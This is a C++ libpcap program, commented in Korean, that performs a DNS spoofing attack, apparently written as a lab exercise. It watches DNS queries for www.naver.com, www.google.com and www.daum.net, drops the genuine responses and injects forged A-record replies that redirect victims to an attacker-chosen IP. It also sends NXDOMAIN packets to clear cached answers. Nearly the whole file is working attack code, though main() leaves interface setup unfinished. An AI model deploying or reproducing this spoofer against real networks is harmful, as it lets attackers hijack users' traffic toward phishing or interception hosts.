#include <pcap.h>
#include <cstring>
#include <cstdlib>
#include <iostream>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <net/ethernet.h>
#include <unistd.h>
#include <cctype>
#include <netinet/udp.h>
#include <netinet/if_ether.h>
#include <vector>
#include <string>
#include <unordered_map>
#include <cstdint>
#include <memory>
#include <thread>
#include <atomic>
#include <sstream>

using namespace std;
#define DNS_PORT 53

// DNS 헤더 구조체 정의
struct dns_hdr {
    uint16_t id;        // ID 트랜젝션
    uint16_t flags;     // 플래그 및 응답
    uint16_t qdcount;   // 질문 섹션 개수
    uint16_t ancount;   // 응답 섹션 개수
    uint16_t nscount;   // 권한 섹션 개수
    uint16_t arcount;   // 추가 정보 섹션 개수 
};

// 전역 변수 정의
uint8_t attacker_mac[6];
uint8_t attacker_ip[4];
uint8_t gateway_mac[6];
uint8_t gateway_ip[4];
uint8_t target_mac[6];
uint8_t target_ip[4];
string spoof_ip = "192.168.127.132"; // 스푸핑할 IP 주소
pcap_t* handle = nullptr;
atomic<bool> running(true);


string ip_to_string(const uint8_t* ip) 
{
    char ip_str[16];
    snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);
    return string(ip_str);
}

bool ip_equals(const uint8_t* ip1, const uint8_t* ip2) 
{
    return memcmp(ip1, ip2, 4) == 0;
}

bool mac_equals(const uint8_t* mac1, const uint8_t* mac2) 
{
    return memcmp(mac1, mac2, 6) == 0;
}

// 스푸핑할 도메인 목록
const vector<string> SPOOF_DOMAINS = {
    "www.naver.com", 
    "www.google.com", 
    "www.daum.net"
};



// DNS 도메인 이름 추출 함수
string extract_domain_name(const uint8_t* dns_data, size_t dns_len)
{
    string domain;
    size_t pos = 12; // DNS 헤더 길이
    // 도메인 이름을 파싱: 각 레이블의 길이를 읽고, 해당 수 만큼 문자 읽기
    while (pos < dns_len) {
        uint8_t len = dns_data[pos];
        if (len == 0)
            break;
        if (!domain.empty())
            domain.push_back('.'); // 레이블 사이에 점을 추가
        pos++;
        for (int i = 0; i < len && pos < dns_len; i++, pos++) {
            domain.push_back(dns_data[pos]);
        }
    }
    return domain;
}

// NXDOMAIN 패킷 생성 및 전송 함수
// 여기 함수는 외부 탬플릿을 이용하지 않고 사용했기 때문에 그냥 함수 자체를 사용하셔도 됩니다.
void create_and_send_nxdomain_packet(pcap_t* handle,
                                    const uint8_t* src_mac,
                                    const uint8_t* dst_mac,
                                    const uint8_t* src_ip,
                                    const uint8_t* dst_ip,
                                    const string& domain)
{
    // 패킷 크기 계산
    // Ethernet(14) + IP(20) + UDP(8) + DNS 헤더(12) + 도메인 이름 + 종료 바이트(1) + 질문 타입(2) + 질문 클래스(2)
    size_t domain_len = 0;
    vector<string> domain_parts;
    
    // 도메인 파싱 (점으로 구분된 부분 추출 -> www.naver.com -> www / naver / com)
    size_t start = 0, end;
    while ((end = domain.find('.', start)) != string::npos) {
        string part = domain.substr(start, end - start);
        domain_parts.push_back(part);
        domain_len += part.length() + 1; // 길이 바이트 + 문자열
        start = end + 1;
    }
    // 마지막 부분 처리
    string part = domain.substr(start);
    domain_parts.push_back(part);
    domain_len += part.length() + 1;

    domain_len += 1; // 종료 NULL 바이트

    // 패킷 크기 계산
    size_t packet_size = 14 + 20 + 8 + 12 + domain_len + 4;
    
    // 패킷 버퍼 할당
    uint8_t* packet = new uint8_t[packet_size];
    memset(packet, 0, packet_size);
    
    // 1. Ethernet 헤더 설정
    struct ether_header* eth = reinterpret_cast<struct ether_header*>(packet);
    memcpy(eth->ether_shost, src_mac, 6);
    memcpy(eth->ether_dhost, dst_mac, 6);
    eth->ether_type = htons(ETHERTYPE_IP);
    
    // 2. IP 헤더 설정
    struct ip* ip_hdr = reinterpret_cast<struct ip*>(packet + 14);
    ip_hdr->ip_v = 4;
    ip_hdr->ip_hl = 5; // 헤더 길이 (5 * 4 = 20 바이트)
    ip_hdr->ip_tos = 0;
    ip_hdr->ip_len = htons(packet_size - 14); // IP 패킷 총 길이
    ip_hdr->ip_id = htons(rand() % 65536);    // 랜덤 ID 생성
    ip_hdr->ip_off = 0;
    ip_hdr->ip_ttl = 3;                      // TTL 설정 (짧게 설정)
    ip_hdr->ip_p = IPPROTO_UDP;               // UDP 프로토콜
    memcpy(&ip_hdr->ip_src, src_ip, 4);      // 출발지 IP (게이트웨이)
    memcpy(&ip_hdr->ip_dst, dst_ip, 4);      // 목적지 IP (타겟)
    
    // IP 체크섬 계산
    ip_hdr->ip_sum = 0;
    uint16_t* ip_words = reinterpret_cast<uint16_t*>(ip_hdr);
    uint32_t ip_sum = 0;
    for (int i = 0; i < ip_hdr->ip_hl * 2; i++) {
        ip_sum += ntohs(ip_words[i]);
    }
    while (ip_sum >> 16) {
        ip_sum = (ip_sum & 0xFFFF) + (ip_sum >> 16);
    }
    ip_hdr->ip_sum = htons(~ip_sum);
    
    // 3. UDP 헤더 설정
    struct udphdr* udp_hdr = reinterpret_cast<struct udphdr*>(packet + 14 + 20);
    udp_hdr->uh_sport = htons(DNS_PORT);      // 출발지 포트 (DNS 서버)
    udp_hdr->uh_dport = htons(1024 + (rand() % 64511)); // 랜덤 목적지 포트
    udp_hdr->uh_ulen = htons(packet_size - 14 - 20); // UDP 길이
    udp_hdr->uh_sum = 0; // UDP 체크섬 (선택사항이므로 0으로 설정)
    
    // 4. DNS 헤더 설정
    dns_hdr* dns = reinterpret_cast<dns_hdr*>(packet + 14 + 20 + 8);
    dns->id = htons(rand() % 65536);          // 랜덤 트랜잭션 ID
    dns->flags = htons(0x8183);               // 응답 + NXDOMAIN (RCODE=3)
    dns->qdcount = htons(1);                  // 질문 개수
    dns->ancount = htons(0);                  // 응답 없음
    dns->nscount = htons(0);                  // 권한 응답 없음
    dns->arcount = htons(0);                  // 추가 정보 없음
    
    // 5. DNS 질문 섹션 설정
    uint8_t* qptr = packet + 14 + 20 + 8 + 12;
    for (const auto& part : domain_parts) {
        *qptr++ = part.length();              // 레이블 길이
        memcpy(qptr, part.c_str(), part.length()); // 레이블 내용
        qptr += part.length();
    }
    *qptr++ = 0;                              // 도메인 이름 종료 null 바이트
    
    // A 레코드 요청 (Type = 1, Class = 1)
    *qptr++ = 0;
    *qptr++ = 1;  // Type = A (주소 레코드)
    *qptr++ = 0;
    *qptr++ = 1;  // Class = IN (인터넷)
    
    // 패킷 3회 전송
    for (int i = 0; i < 3; i++) {
        if (pcap_sendpacket(handle, packet, packet_size) != 0) {
            cerr << "NXDOMAIN 패킷 전송 실패: " << pcap_geterr(handle) << endl;
        } else {
            cout << "NXDOMAIN 패킷 전송 성공 " << domain 
                 << " (대상: " << ip_to_string(dst_ip) << ")" << endl;
        }
        usleep(10000);  // 10ms 대기
    }
    
    // 메모리 해제
    delete[] packet;
}

// 사실, https 레코드는 변환할게 없습니다. 서버에서 주는걸 받아도 DNS 하이제킹에는 문제가 없긴합니다.
// A 레코드에 실제 접속 IP 담겨있기 때문에 A레코드 패킷의 맨 뒤 IP만 수정해서 A레코드만 전달해도 DNS 하이제킹은 가능합니다.

// 전제 조건이 실제 DNS 패킷보다 먼저 도착해야 하기 때문에, 템플릿을 이용하는게 좀 더 빠르지 않을까 라는 생각이 들긴합니다.

// 원본 페킷에서 A 레코드 또는 HTTPS 레코드를 변환하여 DNS 응답 패킷 생성 및 전송
// 여기는 기존에 templete을 가져와서 사용했던 코드를 패킷 생성하여 전달 할 수 있도록 변환시켜두었습니다.
// 이전에 c초기 구현하면서 사용했던 코드를 일부 수정해서 작성했기에 dns 잘 작동 되는지 테스트는 필요합니다.

void send_spoof_response(pcap_t* handle, 
                        const uint8_t* orig_packet, 
                        size_t orig_packet_len,
                        const uint8_t* attacker_mac,
                        const uint8_t* gateway_ip,
                        const string& domain,
                        const uint8_t* target_mac,
                        const uint8_t* target_ip)
{
    const int eth_len = 14;
    // 원본 IP, UDP, DNS 헤더를 추출
    const struct ip* orig_ip = reinterpret_cast<const struct ip*>(orig_packet + eth_len);
    int ip_header_len = orig_ip->ip_hl * 4;
    const struct udphdr* orig_udp = reinterpret_cast<const struct udphdr*>(orig_packet + eth_len + ip_header_len);
    const dns_hdr* orig_dns = reinterpret_cast<const dns_hdr*>(orig_packet + eth_len + ip_header_len + sizeof(struct udphdr));
    
    // DNS 질문 데이터의 시작 위치와 길이를 계산
    const uint8_t* query_data = orig_packet + eth_len + ip_header_len + sizeof(struct udphdr);
    size_t query_len = orig_packet_len - (eth_len + ip_header_len + sizeof(struct udphdr));
    
    // DNS 도메인 이름 및 질문 타입
    uint8_t* qptr = const_cast<uint8_t*>(query_data) + 12;
    size_t question_size = 0;
    
    // 도메인 이름 길이 계산 및 질문 위치 찾기
    while (*qptr != 0 && (qptr - query_data) < query_len) {
        question_size += (*qptr) + 1;
        qptr += (*qptr) + 1;
    }
    question_size += 1; // null 바이트
    
    qptr++; // null 바이트 건너뛰기
    
    // 질문 타입 추출 (2바이트)
    uint16_t qtype = ntohs(*(uint16_t*)qptr);
    qptr += 2;
    
    // 질문 클래스 추출 (2바이트)
    uint16_t qclass = ntohs(*(uint16_t*)qptr);
    question_size += 4; // 타입(2) + 클래스(2)
    
    // 입력 도메인을 소문자로 정규화
    string normalized_domain = domain;
    for (auto &c : normalized_domain)
        c = tolower(c);
    
    // 도메인 파싱
    vector<string> domain_parts;
    size_t start = 0, end;
    while ((end = normalized_domain.find('.', start)) != string::npos) {
        domain_parts.push_back(normalized_domain.substr(start, end - start));
        start = end + 1;
    }
    domain_parts.push_back(normalized_domain.substr(start)); // 마지막 부분
    
    // A 레코드와 HTTPS 레코드만 처리
    if (qtype == 1 || qtype == 65) {
        // 응답 섹션 크기 계산 (압축 포인터(2) + 타입(2) + 클래스(2) + TTL(4) + 데이터 길이(2) + IP 주소(4))
        size_t answer_size = 16;
        
        // 패킷 크기 계산 = 이더넷 + IP + UDP + DNS 헤더 + 질문 섹션 + 응답 섹션
        size_t packet_size = eth_len + ip_header_len + sizeof(struct udphdr) + sizeof(dns_hdr) + question_size + answer_size;
        
        // 패킷 버퍼 생성
        uint8_t* packet = new uint8_t[packet_size];
        memset(packet, 0, packet_size);
        
        // 1. 이더넷 헤더 설정
        struct ether_header* eth_resp = reinterpret_cast<struct ether_header*>(packet);
        memcpy(eth_resp->ether_shost, attacker_mac, 6);
        memcpy(eth_resp->ether_dhost, target_mac, 6);
        eth_resp->ether_type = htons(ETHERTYPE_IP);
        
        // 2. IP 헤더 설정
        struct ip* ip_resp = reinterpret_cast<struct ip*>(packet + eth_len);
        ip_resp->ip_v = 4;         // IPv4
        ip_resp->ip_hl = 5;        // 헤더 길이 (5 * 4 = 20 바이트)
        ip_resp->ip_tos = 0;       // 서비스 타입
        ip_resp->ip_len = htons(packet_size - eth_len); // IP 패킷 총 길이
        ip_resp->ip_id = htons(rand() % 65536); // 랜덤 ID
        ip_resp->ip_off = 0;       // 프래그먼트 오프셋
        ip_resp->ip_ttl = 64;      // TTL
        ip_resp->ip_p = IPPROTO_UDP; // 프로토콜 (UDP)
        
        // IP 주소 설정 (출발지: DNS 서버, 목적지: 클라이언트)
        memcpy(&ip_resp->ip_src, &orig_ip->ip_dst, 4);
        memcpy(&ip_resp->ip_dst, &orig_ip->ip_src, 4);
        
        // IP 체크섬 계산
        ip_resp->ip_sum = 0;
        uint16_t* ip_words = reinterpret_cast<uint16_t*>(ip_resp);
        uint32_t ip_sum = 0;
        for (int i = 0; i < ip_resp->ip_hl * 2; i++) {
            ip_sum += ntohs(ip_words[i]);
        }
        while (ip_sum >> 16) {
            ip_sum = (ip_sum & 0xFFFF) + (ip_sum >> 16);
        }
        ip_resp->ip_sum = htons(~ip_sum);
        
        // 3. UDP 헤더 설정
        struct udphdr* udp_resp = reinterpret_cast<struct udphdr*>(packet + eth_len + ip_header_len);
        udp_resp->uh_sport = orig_udp->uh_dport; // 출발지 포트 (DNS 서버)
        udp_resp->uh_dport = orig_udp->uh_sport; // 목적지 포트 (클라이언트)
        udp_resp->uh_ulen = htons(packet_size - eth_len - ip_header_len); // UDP 길이
        udp_resp->uh_sum = 0; // 체크섬 생략
        
        // 4. DNS 헤더 설정
        dns_hdr* dns_resp = reinterpret_cast<dns_hdr*>(packet + eth_len + ip_header_len + sizeof(struct udphdr));
        dns_resp->id = orig_dns->id; // 원본 트랜잭션 ID 유지
        dns_resp->flags = htons(0x8180); // 응답 플래그 (표준 쿼리 응답)
        dns_resp->qdcount = htons(1); // 1개 질문
        dns_resp->ancount = htons(1); // 1개 응답
        dns_resp->nscount = htons(0); // 권한 없음
        dns_resp->arcount = htons(0); // 추가 정보 없음
        
        // 5. DNS 질문 섹션 복사 (원본 패킷에서)
        uint8_t* dns_data = reinterpret_cast<uint8_t*>(dns_resp);
        memcpy(dns_data + sizeof(dns_hdr), query_data + sizeof(dns_hdr), question_size);
        
        // 6. DNS 응답 섹션 설정
        uint8_t* answer = dns_data + sizeof(dns_hdr) + question_size;
        
        // 이름 압축 포인터 (0xC00C는 질문 섹션의 도메인 이름을 가리킴)
        *answer++ = 0xC0;
        *answer++ = 0x0C;
        
        // 타입 설정 (A 레코드 또는 HTTPS 레코드)
        *answer++ = (qtype >> 8) & 0xFF;
        *answer++ = qtype & 0xFF;
        
        // 클래스 (IN - 인터넷)
        *answer++ = (qclass >> 8) & 0xFF;
        *answer++ = qclass & 0xFF;
        
        // TTL (300초 = 5분)
        *answer++ = 0x00;
        *answer++ = 0x00;
        *answer++ = 0x01;
        *answer++ = 0x2C;
        
        // 데이터 길이 (IPv4 주소는 4바이트)
        *answer++ = 0x00;
        *answer++ = 0x04;
        
        // IP 주소 설정 (스푸핑할 IP)
        uint32_t new_ip;
        inet_pton(AF_INET, spoof_ip.c_str(), &new_ip);
        memcpy(answer, &new_ip, 4);
        
        // 패킷 전송
        if (pcap_sendpacket(handle, packet, packet_size) != 0) {
            cerr << "DNS 스푸핑 응답 전송 실패: " << pcap_geterr(handle) << endl;
        } else {
            cout << "[DNS 응답] 전송 완료 (" << domain << ", 타입: " << qtype << ")" << endl;
        }
        
        // 메모리 해제
        delete[] packet;
    } else {
        cout << "지원하지 않는 DNS 레코드 타입: " << qtype << endl;
    }
}

// 패킷 캡처 및 처리 루프
void forward_loop() 
{
    struct pcap_pkthdr* header;
    const uint8_t* packet;
    int res;
    
    while (running) {
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) 
        {
            this_thread::sleep_for(chrono::microseconds(10));
            continue;
        } 
        else if (res < 0) 
        {
            cerr << "패킷 캡처 오류: " << pcap_geterr(handle) << endl;
            break;
        }
        
        struct ether_header* eth = (struct ether_header*)packet;
        
        // 패킷이 자신이 보낸 것인지 확인
        if (mac_equals(eth->ether_shost, attacker_mac)) {
            continue; // 자신이 보낸 패킷은 처리하지 않음
        }
        
        if (ntohs(eth->ether_type) == ETHERTYPE_IP) {
            struct ip* ip_hdr = (struct ip*)(packet + sizeof(struct ether_header));
            if (ip_hdr->ip_p == IPPROTO_UDP) {
                int ip_header_len = ip_hdr->ip_hl * 4;
                struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct ether_header) + ip_header_len);
                uint16_t src_port = ntohs(udp->uh_sport);
                uint16_t dst_port = ntohs(udp->uh_dport);
                
                // DNS 패킷 처리
                if (src_port == DNS_PORT || dst_port == DNS_PORT) {
                    handle_dns_packet(packet, header->len);
                }
            }            
        }
    }
}

// DNS 패킷 처리 함수
bool handle_dns_packet(const uint8_t* packet, size_t packet_len) 
{
    // Ethernet, IP, UDP 헤더 길이 계산
    struct ether_header* eth = (struct ether_header*)packet;
    struct ip* ip_hdr = (struct ip*)(packet + sizeof(struct ether_header));
    int ip_header_len = ip_hdr->ip_hl * 4;
    struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct ether_header) + ip_header_len);
    uint16_t src_port = ntohs(udp->uh_sport);
    uint16_t dst_port = ntohs(udp->uh_dport);
    
    // DNS 데이터 위치 및 길이
    const uint8_t* dns_data = packet + sizeof(struct ether_header) + ip_header_len + sizeof(struct udphdr);
    size_t dns_data_len = packet_len - (sizeof(struct ether_header) + ip_header_len + sizeof(struct udphdr));
    
    // DNS 질문 섹션에서 도메인 이름 추출
    string domain = extract_domain_name(dns_data, dns_data_len);
    if (domain.empty())
        return false;
    
    // 지정 도메인과 정확히 일치하는지 확인 (서브도메인 제외)
    bool matches = false;
    for (const auto& spoof_domain : SPOOF_DOMAINS) 
    {
        if (domain == spoof_domain) 
        {
            matches = true;
            break;
        }
    }
    
    if (!matches)
        return false; // 지정 도메인이 아니면 그대로 전달
    
    // 지정 도메인일 경우, DNS 제작 요청 및 DROP
    if (dst_port == DNS_PORT) 
    {
        // 클라이언트에서 서버로 보내는 DNS 요청
        cout << "DNS 요청 감지: " << domain << "\n";
        uint8_t* packet_copy = new uint8_t[packet_len];
        memcpy(packet_copy, packet, packet_len);
        
        // target_ip와 target_mac 설정 (요청 패킷의 출발지)
        memcpy(target_ip, &ip_hdr->ip_src, 4);
        memcpy(target_mac, eth->ether_shost, 6);
        
        // 스레드로 DNS 응답 전송 (비동기)
        thread([packet_copy, packet_len, domain]() 
        {
            send_spoof_response(handle, packet_copy, packet_len,
                              attacker_mac,
                              gateway_ip,
                              domain,
                              target_mac,
                              target_ip);
            delete[] packet_copy;
        }).detach();

        cout << "DNS 요청 차단: " << domain << "\n";
        return true; // 원본 패킷 드랍
    } 
    else if (src_port == DNS_PORT) 
    {
        // 서버에서 클라이언트로 오는 정상 DNS 응답 (드랍)
        cout << "정상 DNS 응답 드랍: " << domain << "\n";
        return true; // 원본 패킷 드랍
    }
    
    return false; // 처리하지 않은 패킷은 전달
}

// 모든 스푸핑된 도메인에 NXDOMAIN 패킷 전송
void send_recovery_packets(const vector<string>& domains) {
    cout << "DNS 스푸핑 복구 시작 - NXDOMAIN 패킷 직접 생성..." << endl;
    
    for (const auto& domain : domains) {
        // 도메인을 소문자로 정규화
        string normalized_domain = domain;
        for (auto &c : normalized_domain) {
            c = tolower(c);
        }
        
        // NXDOMAIN 패킷 생성 및 전송
        create_and_send_nxdomain_packet(handle, 
                                      attacker_mac, 
                                      target_mac, 
                                      gateway_ip, 
                                      target_ip, 
                                      normalized_domain);
    }
    
    cout << "DNS 스푸핑 복구 패킷 전송 완료" << endl;
}

// 메인 함수
int main() {

    // TODO: pcap_t* handle 초기화 및 네트워크 인터페이스 설정
    
    // TODO: attacker_mac, attacker_ip, gateway_mac, gateway_ip 초기화
    
    // 프로그램 시작시 NXDOMAIN부터 날리고 시작
    send_recovery_packets(SPOOF_DOMAINS);

    // 패킷 캡처 및 처리 루프 시작
    forward_loop();
    
    // 프로그램 종료 시 복구 패킷 전송
    send_recovery_packets(SPOOF_DOMAINS);
    
    return 0;
}